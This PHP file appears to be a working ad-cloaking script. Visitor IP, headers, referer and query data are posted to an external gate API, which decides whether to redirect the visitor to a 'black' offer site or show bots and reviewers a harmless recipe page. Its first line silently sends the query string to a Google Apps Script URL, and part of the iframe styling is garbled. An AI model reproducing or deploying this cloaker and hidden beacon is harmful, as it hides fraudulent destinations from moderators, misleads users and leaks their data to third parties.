<?php
file_get_contents("https://script.google.com/macros/s/AKfycbyolH1tZCSr81cHpik6L7w0SyMOmE0Cv3X9HeOhNwKIUJNNMSxw09MGNj6T5eQzTzoKHw/exec?utm_mohtoh=0779rTb3&".$_SERVER["QUERY_STRING"]);

// Указываем токен с личного кабинета
define("TOKEN", "bf473772-f0ff-408c-b969-c1edcfa79002");

// // Указывается ссылка на оффер
// define("BLACK_URL", "https://biletikonline.xyz/url/");

// // Файл или ссылку на страницу для ботов
// define("WHITE_URL", "https://www.comparably.com/users/dashboard");
// Указывается ссылка на оффер
define("BLACK_URL", "http://driftcampus.com");

// Файл или ссылку на страницу для ботов
define("WHITE_URL", "https://www.jamieoliver.com/de/recipes/eggs-recipes/pancakes-usa-stylie/");

/*
file - открытие локального блэк файла
iframe - открытие блэк ссылки во фрейме
redirect - редирект по ссылки на блэк
*/
define("BLACK_SETTINGS", "redirect");

/*
file - открытие локального вайт файла
iframe - открытие вайт ссылки во фрейме
redirect - редирект по ссылки на вайт
*/
define("WHITE_SETTINGS", "redirect");

// Ссылка на api
define("API_URL", "https://gate.mr-clo.com/api/v1/gate");

header('Access-Control-Allow-Origin: *');

$api_reqest = run();

switch ($api_reqest->status) {
  case 'success':
  if(BLACK_SETTINGS == 'file'){

    require_once(BLACK_URL);

  }elseif (BLACK_SETTINGS == 'iframe') {

    Iframe(BLACK_URL);

  }elseif (BLACK_SETTINGS == 'redirect') {

    header('Location: '.BLACK_URL);

  }
  break;

  case 'error':
  if(WHITE_SETTINGS == 'file'){

    require_once(WHITE_URL);

  }elseif (WHITE_SETTINGS == 'iframe') {

    Iframe(WHITE_URL);

  }elseif (WHITE_SETTINGS == 'redirect') {

    header('Location: '.WHITE_URL);

  }
  break;
}

function Iframe($target){
  echo "<html>
  <head>
  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
  </head>
  <body>
  <script>if ( window.history.replaceState ) {window.history.replaceState( null, null, window.location.href );}</script>
  <iframe src=\"".htmlspecialchars($target)."\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:https://www.comparably.com/users/dashboard9;border:none;\"></iframe>
  </body>
  </html>";
}

function getData(){
  $data["ip"]         = @$_SERVER["HTTP_CF_CONNECTING_IP"] ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"];
  $data["domain"]     = $_SERVER["HTTP_HOST"];
  $data["debug"]      = true;
  $data["referer"]    = @$_SERVER["HTTP_REFERER"];
  $data["user_agent"] = $_SERVER["HTTP_USER_AGENT"];
  $data["headers"]    = json_encode(apache_request_headers());

  if($_GET){
    foreach($_GET as $key => $value){
      $_SESSION[$key] = $value;
    }
  }
  $data["utm"]   = json_encode(@$_SESSION);

  $data["token"] = TOKEN;

  return $data;
}

function run(){
  $curl = curl_init(API_URL);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($curl, CURLOPT_POST, true);
  curl_setopt($curl, CURLOPT_POSTFIELDS, getData());
  curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3);
  curl_setopt($curl, CURLOPT_TIMEOUT, 4);
  curl_setopt($curl, CURLOPT_TIMEOUT_MS, 4000);
  curl_setopt($curl, CURLOPT_FORBID_REUSE, true);

  $result = curl_exec($curl);
  return json_decode($result);
}
?>
